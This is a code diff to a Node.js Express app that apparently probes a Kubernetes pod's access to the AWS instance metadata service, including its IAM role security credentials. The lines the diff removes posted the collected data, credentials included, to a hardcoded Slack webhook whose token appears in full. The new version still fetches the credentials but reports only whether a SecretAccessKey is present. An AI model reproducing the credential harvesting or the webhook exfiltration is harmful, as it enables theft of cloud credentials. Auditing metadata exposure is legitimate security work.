@@ -6,7 +6,6 @@ const bodyParser = require('body-parser');
 const os = require('os');
 const fs = require('fs');
 const path = require('path');
-var SlackWebhook = require('slack-webhook');
 
 const app = express()
 const portt = 4499
@@ -23,43 +22,52 @@ var ipv4local = "";
 var amiid = "";
 var localhostname = "";
 var publichostname = "";
-var hostnamekube = "";
 var awsregion = "";
-var seccreds = "";
+var workername = "";
+var haveCredentials = false;
+
+var URL = "http://169.254.169.254/latest/meta-data/"
+
 
 app.get('/', function (req, res) {
 
   // Requests for specific Kubernetes
-  request('http://169.254.169.254/latest/meta-data/public-ipv4', { json: true }, (err, res, body) => {
+  request(URL + 'public-ipv4', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     ipv4public = body;
   });
-  request('http://169.254.169.254/latest/meta-data/local-ipv4', { json: true }, (err, res, body) => {
+  request(URL + 'local-ipv4', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     ipv4local = body;
   });
-  request('http://169.254.169.254/latest/meta-data/ami-id', { json: true }, (err, res, body) => {
+  request(URL + 'ami-id', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     amiid = body;
   });
-  request('http://169.254.169.254/latest/meta-data/local-hostname', { json: true }, (err, res, body) => {
+  request(URL + 'local-hostname', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     localhostname = body;
   });
-  request('http://169.254.169.254/latest/meta-data/public-hostname', { json: true }, (err, res, body) => {
+  request(URL + 'public-hostname', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     publichostname = body;
   });
-  request('http://169.254.169.254/latest/meta-data/placement/availability-zone', { json: true }, (err, res, body) => {
+  request(URL + 'placement/availability-zone', { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     awsregion = body;
   });
 
   //sec cred + role name
-  request('http://169.254.169.254/latest/meta-data/iam/security-credentials', { json: true }, (err, res, body) => {
+  request(URL + 'iam/security-credentials', { json: true }, (err, res, body) => {
+    if (err) { return console.log(err); }
+    workername = body;
+  });
+  request(URL + 'iam/security-credentials/' + workername, { json: true }, (err, res, body) => {
     if (err) { return console.log(err); }
     credentials = body;
+    haveCredentials = credentials.includes("SecretAccessKey")
   });
+
 
   var jsonResponse = {
 
@@ -76,23 +84,13 @@ app.get('/', function (req, res) {
     localhostnamekube: localhostname,
     publichostnamekube: publichostname,
     awsregionkube: awsregion,
-    seccreds:credentials,
-
+    kubeCerds: haveCredentials
   }
 
   fs.writeFile('Downloads/pod-info.json', JSON.stringify(jsonResponse), (err) => {
     if (err) throw err;
     console.log('File Saved!');
   });
-
-var slack = new SlackWebhook('https://hooks.slack.com/services/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', {
-  defaults: {
-    username: 'hiJerker',
-    channel: '#kube-info-post',
-    icon_emoji: ':cucumber:'
-  }
-})
-slack.send(JSON.stringify(jsonResponse))
 
   res.render('indexone', jsonResponse);
 });
